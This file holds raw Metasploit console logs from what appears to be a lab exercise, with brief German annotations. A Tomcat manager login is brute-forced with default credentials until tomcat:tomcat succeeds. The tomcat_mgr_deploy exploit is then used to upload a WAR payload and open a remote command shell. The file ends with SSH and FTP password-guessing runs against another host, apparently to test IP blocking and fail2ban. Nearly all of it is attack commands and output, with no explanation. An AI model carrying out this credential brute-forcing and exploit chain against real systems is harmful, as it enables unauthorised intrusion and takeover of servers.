+msf  auxiliary(tomcat_mgr_login) > set USER_FILE /opt/metasploit/msf3/data/wordlists/tomcat_mgr_default_users.txt 
+USER_FILE => /opt/metasploit/msf3/data/wordlists/tomcat_mgr_default_users.txt
+msf  auxiliary(tomcat_mgr_login) > set RHOSTS 10.1.1.130
+RHOSTS => 10.1.1.130
+msf auxiliary(tomcat_mgr_login) > set RPORT 8180
+RPORT => 8180
+
+
+msf  auxiliary(tomcat_mgr_login) > run
+
+[*] 10.1.1.130:8180 TOMCAT_MGR - [01/56] - Trying username:'admin' with password:''
+[-] 10.1.1.130:8180 TOMCAT_MGR - [01/56] - /manager/html [Apache-Coyote/1.1] [Tomcat Application Manager] failed to login as 'admin'
+[*] 10.1.1.130:8180 TOMCAT_MGR - [02/56] - Trying username:'manager' with password:''
+[-] 10.1.1.130:8180 TOMCAT_MGR - [02/56] - /manager/html [Apache-Coyote/1.1] [Tomcat Application Manager] failed to login as 'manager'
+[*] 10.1.1.130:8180 TOMCAT_MGR - [03/56] - Trying username:'role1' with password:''
+[-] 10.1.1.130:8180 TOMCAT_MGR - [03/56] - /manager/html [Apache-Coyote/1.1] [Tomcat Application Manager] failed to login as 'role1'
+[*] 10.1.1.130:8180 TOMCAT_MGR - [04/56] - Trying username:'root' with password:''
+[-] 10.1.1.130:8180 TOMCAT_MGR - [04/56] - /manager/html [Apache-Coyote/1.1] [Tomcat Application Manager] failed to login as 'root'
+[*] 10.1.1.130:8180 TOMCAT_MGR - [05/56] - Trying username:'tomcat' with password:''
+[-] 10.1.1.130:8180 TOMCAT_MGR - [05/56] - /manager/html [Apache-Coyote/1.1] [Tomcat Application Manager] failed to login as 'tomcat'
+[*] 10.1.1.130:8180 TOMCAT_MGR - [06/56] - Trying username:'both' with password:''
+[-] 10.1.1.130:8180 TOMCAT_MGR - [06/56] - /manager/html [Apache-Coyote/1.1] [Tomcat Application Manager] failed to login as 'both'
+[*] 10.1.1.130:8180 TOMCAT_MGR - [07/56] - Trying username:'j2deployer' with password:''
+[-] 10.1.1.130:8180 TOMCAT_MGR - [07/56] - /manager/html [Apache-Coyote/1.1] [Tomcat Application Manager] failed to login as 'j2deployer'
+[*] 10.1.1.130:8180 TOMCAT_MGR - [08/56] - Trying username:'ovwebusr' with password:''
+[-] 10.1.1.130:8180 TOMCAT_MGR - [08/56] - /manager/html [Apache-Coyote/1.1] [Tomcat Application Manager] failed to login as 'ovwebusr'
+[*] 10.1.1.130:8180 TOMCAT_MGR - [09/56] - Trying username:'cxsdk' with password:''
+[-] 10.1.1.130:8180 TOMCAT_MGR - [09/56] - /manager/html [Apache-Coyote/1.1] [Tomcat Application Manager] failed to login as 'cxsdk'
+[*] 10.1.1.130:8180 TOMCAT_MGR - [10/56] - Trying username:'ADMIN' with password:''
+[-] 10.1.1.130:8180 TOMCAT_MGR - [10/56] - /manager/html [Apache-Coyote/1.1] [Tomcat Application Manager] failed to login as 'ADMIN'
+[*] 10.1.1.130:8180 TOMCAT_MGR - [11/56] - Trying username:'xampp' with password:''
+[-] 10.1.1.130:8180 TOMCAT_MGR - [11/56] - /manager/html [Apache-Coyote/1.1] [Tomcat Application Manager] failed to login as 'xampp'
+[*] 10.1.1.130:8180 TOMCAT_MGR - [12/56] - Trying username:'admin' with password:'admin'
+[-] 10.1.1.130:8180 TOMCAT_MGR - [12/56] - /manager/html [Apache-Coyote/1.1] [Tomcat Application Manager] failed to login as 'admin'
+[*] 10.1.1.130:8180 TOMCAT_MGR - [13/56] - Trying username:'manager' with password:'manager'
+[-] 10.1.1.130:8180 TOMCAT_MGR - [13/56] - /manager/html [Apache-Coyote/1.1] [Tomcat Application Manager] failed to login as 'manager'
+[*] 10.1.1.130:8180 TOMCAT_MGR - [14/56] - Trying username:'role1' with password:'role1'
+[-] 10.1.1.130:8180 TOMCAT_MGR - [14/56] - /manager/html [Apache-Coyote/1.1] [Tomcat Application Manager] failed to login as 'role1'
+[*] 10.1.1.130:8180 TOMCAT_MGR - [15/56] - Trying username:'root' with password:'root'
+[-] 10.1.1.130:8180 TOMCAT_MGR - [15/56] - /manager/html [Apache-Coyote/1.1] [Tomcat Application Manager] failed to login as 'root'
+[*] 10.1.1.130:8180 TOMCAT_MGR - [16/56] - Trying username:'tomcat' with password:'tomcat'
+[+] http://10.1.1.130:8180/manager/html [Apache-Coyote/1.1] [Tomcat Application Manager] successful login 'tomcat' : 'tomcat'
+[*] 10.1.1.130:8180 TOMCAT_MGR - [17/56] - Trying username:'both' with password:'both'
+[-] 10.1.1.130:8180 TOMCAT_MGR - [17/56] - /manager/html [Apache-Coyote/1.1] [Tomcat Application Manager] failed to login as 'both'
+[*] 10.1.1.130:8180 TOMCAT_MGR - [18/56] - Trying username:'j2deployer' with password:'j2deployer'
+[-] 10.1.1.130:8180 TOMCAT_MGR - [18/56] - /manager/html [Apache-Coyote/1.1] [Tomcat Application Manager] failed to login as 'j2deployer'
+[*] 10.1.1.130:8180 TOMCAT_MGR - [19/56] - Trying username:'ovwebusr' with password:'ovwebusr'
+[-] 10.1.1.130:8180 TOMCAT_MGR - [19/56] - /manager/html [Apache-Coyote/1.1] [Tomcat Application Manager] failed to login as 'ovwebusr'
+[*] 10.1.1.130:8180 TOMCAT_MGR - [20/56] - Trying username:'cxsdk' with password:'cxsdk'
+[-] 10.1.1.130:8180 TOMCAT_MGR - [20/56] - /manager/html [Apache-Coyote/1.1] [Tomcat Application Manager] failed to login as 'cxsdk'
+[*] 10.1.1.130:8180 TOMCAT_MGR - [21/56] - Trying username:'ADMIN' with password:'ADMIN'
+[-] 10.1.1.130:8180 TOMCAT_MGR - [21/56] - /manager/html [Apache-Coyote/1.1] [Tomcat Application Manager] failed to login as 'ADMIN'
+[*] 10.1.1.130:8180 TOMCAT_MGR - [22/56] - Trying username:'xampp' with password:'xampp'
+[-] 10.1.1.130:8180 TOMCAT_MGR - [22/56] - /manager/html [Apache-Coyote/1.1] [Tomcat Application Manager] failed to login as 'xampp'
+[*] 10.1.1.130:8180 TOMCAT_MGR - [23/56] - Trying username:'ovwebusr' with password:'OvW*busr1'
+[-] 10.1.1.130:8180 TOMCAT_MGR - [23/56] - /manager/html [Apache-Coyote/1.1] [Tomcat Application Manager] failed to login as 'ovwebusr'
+[*] 10.1.1.130:8180 TOMCAT_MGR - [24/56] - Trying username:'cxsdk' with password:'kdsxc'
+[-] 10.1.1.130:8180 TOMCAT_MGR - [24/56] - /manager/html [Apache-Coyote/1.1] [Tomcat Application Manager] failed to login as 'cxsdk'
+[*] 10.1.1.130:8180 TOMCAT_MGR - [25/56] - Trying username:'root' with password:'owaspbwa'
+[-] 10.1.1.130:8180 TOMCAT_MGR - [25/56] - /manager/html [Apache-Coyote/1.1] [Tomcat Application Manager] failed to login as 'root'
+[*] 10.1.1.130:8180 TOMCAT_MGR - [26/56] - Trying username:'admin' with password:'manager'
+[-] 10.1.1.130:8180 TOMCAT_MGR - [26/56] - /manager/html [Apache-Coyote/1.1] [Tomcat Application Manager] failed to login as 'admin'
+[*] 10.1.1.130:8180 TOMCAT_MGR - [27/56] - Trying username:'admin' with password:'role1'
+[-] 10.1.1.130:8180 TOMCAT_MGR - [27/56] - /manager/html [Apache-Coyote/1.1] [Tomcat Application Manager] failed to login as 'admin'
+[*] 10.1.1.130:8180 TOMCAT_MGR - [28/56] - Trying username:'admin' with password:'root'
+[-] 10.1.1.130:8180 TOMCAT_MGR - [28/56] - /manager/html [Apache-Coyote/1.1] [Tomcat Application Manager] failed to login as 'admin'
+[*] 10.1.1.130:8180 TOMCAT_MGR - [29/56] - Trying username:'admin' with password:'tomcat'
+[-] 10.1.1.130:8180 TOMCAT_MGR - [29/56] - /manager/html [Apache-Coyote/1.1] [Tomcat Application Manager] failed to login as 'admin'
+[*] 10.1.1.130:8180 TOMCAT_MGR - [30/56] - Trying username:'admin' with password:'s3cret'
+[-] 10.1.1.130:8180 TOMCAT_MGR - [30/56] - /manager/html [Apache-Coyote/1.1] [Tomcat Application Manager] failed to login as 'admin'
+[*] 10.1.1.130:8180 TOMCAT_MGR - [31/56] - Trying username:'manager' with password:'admin'
+[-] 10.1.1.130:8180 TOMCAT_MGR - [31/56] - /manager/html [Apache-Coyote/1.1] [Tomcat Application Manager] failed to login as 'manager'
+[*] 10.1.1.130:8180 TOMCAT_MGR - [32/56] - Trying username:'manager' with password:'role1'
+[-] 10.1.1.130:8180 TOMCAT_MGR - [32/56] - /manager/html [Apache-Coyote/1.1] [Tomcat Application Manager] failed to login as 'manager'
+[*] 10.1.1.130:8180 TOMCAT_MGR - [33/56] - Trying username:'manager' with password:'root'
+[-] 10.1.1.130:8180 TOMCAT_MGR - [33/56] - /manager/html [Apache-Coyote/1.1] [Tomcat Application Manager] failed to login as 'manager'
+[*] 10.1.1.130:8180 TOMCAT_MGR - [34/56] - Trying username:'manager' with password:'tomcat'
+[-] 10.1.1.130:8180 TOMCAT_MGR - [34/56] - /manager/html [Apache-Coyote/1.1] [Tomcat Application Manager] failed to login as 'manager'
+[*] 10.1.1.130:8180 TOMCAT_MGR - [35/56] - Trying username:'manager' with password:'s3cret'
+[-] 10.1.1.130:8180 TOMCAT_MGR - [35/56] - /manager/html [Apache-Coyote/1.1] [Tomcat Application Manager] failed to login as 'manager'
+[*] 10.1.1.130:8180 TOMCAT_MGR - [36/56] - Trying username:'role1' with password:'admin'
+[-] 10.1.1.130:8180 TOMCAT_MGR - [36/56] - /manager/html [Apache-Coyote/1.1] [Tomcat Application Manager] failed to login as 'role1'
+[*] 10.1.1.130:8180 TOMCAT_MGR - [37/56] - Trying username:'role1' with password:'manager'
+[-] 10.1.1.130:8180 TOMCAT_MGR - [37/56] - /manager/html [Apache-Coyote/1.1] [Tomcat Application Manager] failed to login as 'role1'
+[*] 10.1.1.130:8180 TOMCAT_MGR - [38/56] - Trying username:'role1' with password:'root'
+[-] 10.1.1.130:8180 TOMCAT_MGR - [38/56] - /manager/html [Apache-Coyote/1.1] [Tomcat Application Manager] failed to login as 'role1'
+[*] 10.1.1.130:8180 TOMCAT_MGR - [39/56] - Trying username:'role1' with password:'tomcat'
+[-] 10.1.1.130:8180 TOMCAT_MGR - [39/56] - /manager/html [Apache-Coyote/1.1] [Tomcat Application Manager] failed to login as 'role1'
+[*] 10.1.1.130:8180 TOMCAT_MGR - [40/56] - Trying username:'role1' with password:'s3cret'
+[-] 10.1.1.130:8180 TOMCAT_MGR - [40/56] - /manager/html [Apache-Coyote/1.1] [Tomcat Application Manager] failed to login as 'role1'
+[*] 10.1.1.130:8180 TOMCAT_MGR - [41/56] - Trying username:'root' with password:'admin'
+[-] 10.1.1.130:8180 TOMCAT_MGR - [41/56] - /manager/html [Apache-Coyote/1.1] [Tomcat Application Manager] failed to login as 'root'
+[*] 10.1.1.130:8180 TOMCAT_MGR - [42/56] - Trying username:'root' with password:'manager'
+[-] 10.1.1.130:8180 TOMCAT_MGR - [42/56] - /manager/html [Apache-Coyote/1.1] [Tomcat Application Manager] failed to login as 'root'
+[*] 10.1.1.130:8180 TOMCAT_MGR - [43/56] - Trying username:'root' with password:'role1'
+[-] 10.1.1.130:8180 TOMCAT_MGR - [43/56] - /manager/html [Apache-Coyote/1.1] [Tomcat Application Manager] failed to login as 'root'
+[*] 10.1.1.130:8180 TOMCAT_MGR - [44/56] - Trying username:'root' with password:'tomcat'
+[-] 10.1.1.130:8180 TOMCAT_MGR - [44/56] - /manager/html [Apache-Coyote/1.1] [Tomcat Application Manager] failed to login as 'root'
+[*] 10.1.1.130:8180 TOMCAT_MGR - [45/56] - Trying username:'root' with password:'s3cret'
+[-] 10.1.1.130:8180 TOMCAT_MGR - [45/56] - /manager/html [Apache-Coyote/1.1] [Tomcat Application Manager] failed to login as 'root'
+[*] 10.1.1.130:8180 TOMCAT_MGR - [46/56] - Trying username:'both' with password:'admin'
+[-] 10.1.1.130:8180 TOMCAT_MGR - [46/56] - /manager/html [Apache-Coyote/1.1] [Tomcat Application Manager] failed to login as 'both'
+[*] 10.1.1.130:8180 TOMCAT_MGR - [47/56] - Trying username:'both' with password:'manager'
+[-] 10.1.1.130:8180 TOMCAT_MGR - [47/56] - /manager/html [Apache-Coyote/1.1] [Tomcat Application Manager] failed to login as 'both'
+[*] 10.1.1.130:8180 TOMCAT_MGR - [48/56] - Trying username:'both' with password:'role1'
+[-] 10.1.1.130:8180 TOMCAT_MGR - [48/56] - /manager/html [Apache-Coyote/1.1] [Tomcat Application Manager] failed to login as 'both'
+[*] 10.1.1.130:8180 TOMCAT_MGR - [49/56] - Trying username:'both' with password:'root'
+[-] 10.1.1.130:8180 TOMCAT_MGR - [49/56] - /manager/html [Apache-Coyote/1.1] [Tomcat Application Manager] failed to login as 'both'
+[*] 10.1.1.130:8180 TOMCAT_MGR - [50/56] - Trying username:'both' with password:'tomcat'
+[-] 10.1.1.130:8180 TOMCAT_MGR - [50/56] - /manager/html [Apache-Coyote/1.1] [Tomcat Application Manager] failed to login as 'both'
+[*] 10.1.1.130:8180 TOMCAT_MGR - [51/56] - Trying username:'both' with password:'s3cret'
+[-] 10.1.1.130:8180 TOMCAT_MGR - [51/56] - /manager/html [Apache-Coyote/1.1] [Tomcat Application Manager] failed to login as 'both'
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+
+
+Explout config
+msf  exploit(tomcat_mgr_deploy) > set PASSWORD tomcat
+PASSWORD => tomcat
+msf  exploit(tomcat_mgr_deploy) > set USERNAME tomcat
+USERNAME => tomcat
+msf  exploit(tomcat_mgr_deploy) > set RHOST 10.1.1.130
+RHOST => 10.1.1.130
+msf  exploit(tomcat_mgr_deploy) > set RPORT 8180
+RPORT => 8180
+
+msf  exploit(tomcat_mgr_deploy) > show payloads
+
+Compatible Payloads
+===================
+
+   Name                            Disclosure Date  Rank    Description
+   ----                            ---------------  ----    -----------
+   generic/custom                                   normal  Custom Payload
+   generic/shell_bind_tcp                           normal  Generic Command Shell, Bind TCP Inline
+   generic/shell_reverse_tcp                        normal  Generic Command Shell, Reverse TCP Inline
+   java/meterpreter/bind_tcp                        normal  Java Meterpreter, Java Bind TCP Stager
+   java/meterpreter/reverse_http                    normal  Java Meterpreter, Java Reverse HTTP Stager
+   java/meterpreter/reverse_https                   normal  Java Meterpreter, Java Reverse HTTPS Stager
+   java/meterpreter/reverse_tcp                     normal  Java Meterpreter, Java Reverse TCP Stager
+   java/shell/bind_tcp                              normal  Command Shell, Java Bind TCP Stager
+   java/shell/reverse_tcp                           normal  Command Shell, Java Reverse TCP Stager
+   java/shell_reverse_tcp                           normal  Java Command Shell, Reverse TCP Inline
+
+msf  exploit(tomcat_mgr_deploy) > set PAYLOAD java/shell/bind_tcp 
+PAYLOAD => java/shell/bind_tcp
+
+nach exploit start
+msf  exploit(tomcat_mgr_deploy) > exploit
+
+[*] Started bind handler
+[*] Attempting to automatically select a target...
+[*] Automatically selected target "Linux x86"
+[*] Uploading 6433 bytes as yzesidw.war ...
+[*] Executing /yzesidw/UhoYpa5XFik35upD7upY5PBiJyh5L3U.jsp...
+[*] Undeploying yzesidw ...
+[*] Sending stage (2976 bytes) to 10.1.1.130
+[*] Command shell session 2 opened (10.1.1.131:52058 -> 10.1.1.130:4444) at 2013-11-06 11:20:12 -0500
+
+
+
+#############################
+###############################
+Angriff auf Ubunut 10.1.1.1
+
+nach sperre von IP
+msf  auxiliary(ssh_login) > run
+
+[*] 10.1.1.1:22 SSH - Starting bruteforce
+[*] 10.1.1.1:22 SSH - [01/43] - Trying: username: 'admin' with password: ''
+[-] 10.1.1.1:22 SSH - [01/43] - Retrying 'admin':'' due to connection error
+[-] 10.1.1.1:22 SSH - [01/43] - Retrying 'admin':'' due to connection error
+[-] 10.1.1.1:22 SSH - [01/43] - Retrying 'admin':'' due to connection error
+[-] 10.1.1.1:22 SSH - [01/43] - Could not connect
+[-] 10.1.1.1:22 SSH - [01/43] - Bruteforce cancelled against this service.
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+
+
+nbach fail2ban
+msf  auxiliary(ssh_login) > run
+
+[*] 10.1.1.1:22 SSH - Starting bruteforce
+[*] 10.1.1.1:22 SSH - [01/43] - Trying: username: 'admin' with password: ''
+[-] 10.1.1.1:22 SSH - [01/43] - Failed: 'admin':''
+[*] 10.1.1.1:22 SSH - [02/43] - Trying: username: 'sqladmin' with password: ''
+[-] 10.1.1.1:22 SSH - [02/43] - Failed: 'sqladmin':''
+[*] 10.1.1.1:22 SSH - [03/43] - Trying: username: 'root' with password: ''
+[-] 10.1.1.1:22 SSH - [03/43] - Failed: 'root':''
+[*] 10.1.1.1:22 SSH - [04/43] - Trying: username: 'administrator' with password: ''
+[-] 10.1.1.1:22 SSH - [04/43] - Failed: 'administrator':''
+[*] 10.1.1.1:22 SSH - [05/43] - Trying: username: 'its' with password: ''
+[-] 10.1.1.1:22 SSH - [05/43] - Failed: 'its':''
+[*] 10.1.1.1:22 SSH - [06/43] - Trying: username: 'msfadmin' with password: ''
+[-] 10.1.1.1:22 SSH - [06/43] - Failed: 'msfadmin':''
+[*] 10.1.1.1:22 SSH - [07/43] - Trying: username: 'admin' with password: 'admin'
+[-] 10.1.1.1:22 SSH - [07/43] - Failed: 'admin':'admin'
+[*] 10.1.1.1:22 SSH - [08/43] - Trying: username: 'sqladmin' with password: 'sqladmin'
+[-] 10.1.1.1:22 SSH - [08/43] - Failed: 'sqladmin':'sqladmin'
+[*] 10.1.1.1:22 SSH - [09/43] - Trying: username: 'root' with password: 'root'
+[-] 10.1.1.1:22 SSH - [09/43] - Retrying 'root':'root' due to connection error
+[-] 10.1.1.1:22 SSH - [09/43] - Retrying 'root':'root' due to connection error
+[-] 10.1.1.1:22 SSH - [09/43] - Retrying 'root':'root' due to connection error
+[-] 10.1.1.1:22 SSH - [09/43] - Could not connect
+[-] 10.1.1.1:22 SSH - [09/43] - Bruteforce cancelled against this service.
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+
+
+seetings FTP
+msf  auxiliary(ftp_login) > set PASS_FILE /root/pass.txt 
+PASS_FILE => /root/pass.txt
+msf  auxiliary(ftp_login) > set USER_FILE /root/user.txt 
+USER_FILE => /root/user.txt
+msf  auxiliary(ftp_login) > set RHOSTS 10.1.1.1
+RHOSTS => 10.1.1.1
+
+angriff:
+msf  auxiliary(ftp_login) > run
+
+[*] 10.1.1.1:21 - Starting FTP login sweep
+[*] Connecting to FTP server 10.1.1.1:21...
+[*] Connected to target FTP server.
+[*] 10.1.1.1:21 - FTP Banner: '220 ProFTPD 1.3.2c Server (Debian) [::ffff:10.1.1.1]\x0d\x0a'
+[*] 10.1.1.1:21 FTP - Attempting FTP login for 'anonymous':'IEUser@'
+[*] 10.1.1.1:21 FTP - Failed FTP login for 'anonymous':'IEUser@'
+[*] 10.1.1.1:21 FTP - [01/43] - Attempting FTP login for 'admin':''
+[*] 10.1.1.1:21 FTP - [01/43] - Failed FTP login for 'admin':''
+[*] 10.1.1.1:21 FTP - [02/43] - Attempting FTP login for 'sqladmin':''
+[*] 10.1.1.1:21 FTP - [02/43] - Failed FTP login for 'sqladmin':''
+[*] 10.1.1.1:21 FTP - [03/43] - Attempting FTP login for 'root':''
+[-] 10.1.1.1:21 FTP - [03/43] - Caught EOFError, reconnecting and retrying
+[*] Connecting to FTP server 10.1.1.1:21...
+[*] Connected to target FTP server.
+[*] 10.1.1.1:21 FTP - [03/43] - Failed FTP login for 'root':''
+[*] 10.1.1.1:21 FTP - [04/43] - Attempting FTP login for 'administrator':''
+[-] 10.1.1.1:21 FTP - [04/43] - The server rejected username: 'administrator'
+[*] 10.1.1.1:21 FTP - [05/43] - Attempting FTP login for 'its':''
+[-] 10.1.1.1:21 FTP - [05/43] - The server rejected username: 'its'
+[*] 10.1.1.1:21 FTP - [06/43] - Attempting FTP login for 'msfadmin':''
+[-] 10.1.1.1:21 FTP - [06/43] - The server rejected username: 'msfadmin'
+[*] 10.1.1.1:21 FTP - [07/43] - Attempting FTP login for 'admin':'admin'
+[-] 10.1.1.1:21 FTP - [07/43] - The server rejected username: 'admin'
+[*] 10.1.1.1:21 FTP - [08/43] - Attempting FTP login for 'sqladmin':'sqladmin'
+^C[*] Caught interrupt from the console...
+[*] Auxiliary module execution completed
+
+
+
